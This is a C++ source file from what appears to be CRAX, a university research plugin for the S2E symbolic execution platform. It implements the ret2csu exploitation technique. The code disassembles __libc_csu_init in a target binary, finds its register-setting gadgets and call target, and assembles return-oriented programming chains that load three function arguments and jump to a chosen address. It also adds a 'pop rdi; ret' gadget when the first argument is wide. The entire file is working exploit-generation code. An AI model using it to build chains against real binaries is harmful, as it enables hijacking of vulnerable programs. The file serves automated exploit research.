// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Pwnlib/Util.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>
#include <s2e/Plugins/CRAX/Expr/BinaryExprEvaluator.h>

#include <algorithm>
#include <cassert>

#include "Ret2csu.h"

#define X86_64_MOV_INSN_LEN 3

using namespace klee;

namespace s2e::plugins::crax {

const std::string Ret2csu::s_libcCsuInit = "__libc_csu_init";
const std::string Ret2csu::s_libcCsuInitGadget1 = "__libc_csu_init_gadget1";
const std::string Ret2csu::s_libcCsuInitGadget2 = "__libc_csu_init_gadget2";
const std::string Ret2csu::s_libcCsuInitCallTarget = "__libc_csu_init_call_target";

Ret2csu::Ret2csu()
    : Technique(),
      m_retAddr(),
      m_arg1(),
      m_arg2(),
      m_arg3(),
      m_libcCsuInit(),
      m_libcCsuInitGadget1(),
      m_libcCsuInitGadget2(),
      m_libcCsuInitCallTarget(),
      m_gadget1Regs(),
      m_gadget2Regs(),
      m_gadget2CallReg1(),
      m_gadget2CallReg2(),
      m_isTemplateValid(),
      m_ropSubchainTemplate() {}


void Ret2csu::initialize() {
    parseLibcCsuInit();
    searchGadget2CallTarget();
    resolveRequiredGadgets();
}

bool Ret2csu::checkRequirements() const {
   auto symbolMap = g_crax->getExploit().getElf().symbols();
   return symbolMap.find(s_libcCsuInit) != symbolMap.end();
}

void Ret2csu::resolveRequiredGadgets() {
    // Gadgets
    g_crax->getExploit().registerSymbol(s_libcCsuInit, m_libcCsuInit);
    g_crax->getExploit().registerSymbol(s_libcCsuInitGadget1, m_libcCsuInitGadget1);
    g_crax->getExploit().registerSymbol(s_libcCsuInitGadget2, m_libcCsuInitGadget2);

    // Memory locations
    g_crax->getExploit().registerSymbol(s_libcCsuInitCallTarget, m_libcCsuInitCallTarget);
}


std::vector<RopSubchain> Ret2csu::getRopSubchains() const {
    if (!m_retAddr) {
        return {};
    }

    auto ret = getRopSubchains(m_retAddr, m_arg1, m_arg2, m_arg3);
    ret[0].insert(ret[0].begin(), ConstantExpr::create(0x4141414141414141, Expr::Int64));
    return ret;
}


std::vector<RopSubchain>
Ret2csu::getRopSubchains(const ref<Expr> &retAddr,
                         const ref<Expr> &arg1,
                         const ref<Expr> &arg2,
                         const ref<Expr> &arg3) const {
    RopSubchain ret;

    // If the template is invalid, rebuild it now.
    if (!m_isTemplateValid) {
        m_isTemplateValid = true;
        buildRopSubchainTemplate();
    }

    for (const ref<Expr> &e : m_ropSubchainTemplate[0]) {
        if (auto phe = dyn_cast<PlaceholderExpr>(e)) {
            // If this expr is a placeholder, replace it now.
            if (phe->hasTag("arg1")) {
                ret.push_back(arg1);
            } else if (phe->hasTag("arg2")) {
                ret.push_back(arg2);
            } else if (phe->hasTag("arg3")) {
                ret.push_back(arg3);
            } else if (phe->hasTag("retAddr")) {
                ret.push_back(retAddr);
            } else {
                throw UnhandledPlaceholderException();
            }
        } else {
            // Otherwise, just leave it as it is.
            ret.push_back(e);
        }
    }

    // If arg1 cannot fit within EDI, chain the gadgets to set RDI.
    if (evaluate<uint64_t>(arg1) >= (static_cast<uint64_t>(1) << 32)) {
        const Exploit &exploit = g_crax->getExploit();
        const ELF &elf = exploit.getElf();
        uint64_t gadgetAddr = exploit.resolveGadget("pop rdi ; ret");

        ret.back() = BaseOffsetExpr::create(elf, gadgetAddr);
        ret.push_back(arg1);
        ret.push_back(retAddr);
    }

    return { ret };
}

std::vector<RopSubchain>
Ret2csu::getRopSubchains(uint64_t retAddr,
                         uint64_t arg1,
                         uint64_t arg2,
                         uint64_t arg3) const {
    return getRopSubchains(
        ConstantExpr::create(retAddr, Expr::Int64),
        ConstantExpr::create(arg1, Expr::Int64),
        ConstantExpr::create(arg2, Expr::Int64),
        ConstantExpr::create(arg3, Expr::Int64));
}

void Ret2csu::parseLibcCsuInit() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    // Since there are several variants of __libc_csu_init(),
    // we'll manually disassemble it and parse the offsets of its two gadgets.
    m_libcCsuInit = elf.symbols().at(s_libcCsuInit);

    // Convert instruction generator into a list of instructions.
    std::vector<Instruction> insns = disas().disasm(s_libcCsuInit);

    // Find the offset of gadget1,
    // and save the order of popped registers in gadget1 as a vector.
    for (int i = insns.size() - 1; i >= 0; i--) {
        if (insns[i].mnemonic != "jne") {
            continue;
        }

        m_libcCsuInitGadget1 = insns[i + 1].address - elf.getBase();

        m_gadget1Regs.reserve(7);
        for (int j = i + 1; j < i + 8; j++) {
            const std::string &opStr = insns[j].opStr;
            std::string reg = opStr.substr(0, opStr.find_first_of(','));
            m_gadget1Regs.push_back(std::move(reg));
        }

        m_gadget1Regs.erase(std::remove(m_gadget1Regs.begin(),
                                        m_gadget1Regs.end(),
                                        "rsp"), m_gadget1Regs.end());
        m_gadget1Regs.insert(m_gadget1Regs.begin(), "rsp");
        break;
    }

    assert(m_libcCsuInitGadget1);

    // Find the offset of gadget2,
    // and save the order of register assignments in gadget2 as a std::map<dest, src>.
    for (int i = insns.size() - 1; i >= 0; i--) {
        if (insns[i].mnemonic != "call") {
            continue;
        }

        assert(insns[i - 1].mnemonic == "mov");
        assert(insns[i - 2].mnemonic == "mov");
        assert(insns[i - 3].mnemonic == "mov");

        m_libcCsuInitGadget2 = insns[i].address - 3 * X86_64_MOV_INSN_LEN - elf.getBase();

        for (int j = i - 3; j < i; j++) {
            const std::string &opStr = insns[j].opStr;
            size_t dstRegEndIdx = opStr.find_first_of(',');
            size_t srcRegStartIdx = dstRegEndIdx + 2;  // skips ","
            std::string dstReg = opStr.substr(0, dstRegEndIdx);
            std::string srcReg = opStr.substr(srcRegStartIdx);
            m_gadget2Regs[dstReg] = srcReg;
        }

        // Parse call qword ptr [a + b*8]
        std::string opStr = insns[i].opStr;
        opStr = replace(opStr, "qword ptr [", "");
        opStr = replace(opStr, "*8]", "");
        m_gadget2CallReg1 = opStr.substr(0, opStr.find_first_of(' '));
        m_gadget2CallReg2 = opStr.substr(opStr.find_last_of('+') + 2);
        break;
    }

    assert(m_libcCsuInitGadget2);
}

void Ret2csu::searchGadget2CallTarget(std::string funcName) {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    uint64_t funcAddr = g_crax->getExploit().getElf().getRuntimeAddress(funcName);
    std::vector<uint8_t> funcAddrBytes = p64(funcAddr);
    std::vector<uint64_t> candidates = mem().search(funcAddrBytes);

    if (candidates.empty()) {
        log<WARN>() << "No candidates for " << s_libcCsuInit << "()'s call target\n";
        return;
    }

    // XXX: this only works for candidates in _DYNAMIC.
    m_libcCsuInitCallTarget = candidates[0] - elf.getBase();
}

void Ret2csu::buildRopSubchainTemplate() const {
    const Exploit &exploit = g_crax->getExploit();

    std::map<std::string, std::string> transform = {
        {"rsp", "4141414141414141"},
        {"rbx", "0"},
        {"rbp", "1"},
        {slice(m_gadget2Regs.at("edi"), 0, 3), "arg1"},
        {slice(m_gadget2Regs.at("rsi"), 0, 3), "arg2"},
        {slice(m_gadget2Regs.at("rdx"), 0, 3), "arg3"},
        {m_gadget2CallReg1, s_libcCsuInitCallTarget}
    };

    m_ropSubchainTemplate.clear();
    m_ropSubchainTemplate.resize(1);

    RopSubchain &rop = m_ropSubchainTemplate[0];
    rop.push_back(BaseOffsetExpr::create(exploit, s_libcCsuInitGadget1));
    for (int i = 0; i < 7; i++) {
        std::string content = transform[m_gadget1Regs[i]];

        if (content == "arg1" || content == "arg2" || content == "arg3") {
            rop.push_back(PlaceholderExpr::create(content));
        } else if (isNumString(content)) {
            uint64_t val = std::stoull(content, nullptr, 16);
            rop.push_back(ConstantExpr::create(val, Expr::Int64));
        } else {
            rop.push_back(BaseOffsetExpr::create(exploit, content));
        }
    }
    rop.push_back(BaseOffsetExpr::create(exploit, s_libcCsuInitGadget2));
    for (int i = 0; i < 7; i++) {
        rop.push_back(ConstantExpr::create(0x4141414141414141, Expr::Int64));
    }
    rop.push_back(PlaceholderExpr::create("retAddr"));
}

}  // namespace s2e::plugins::crax
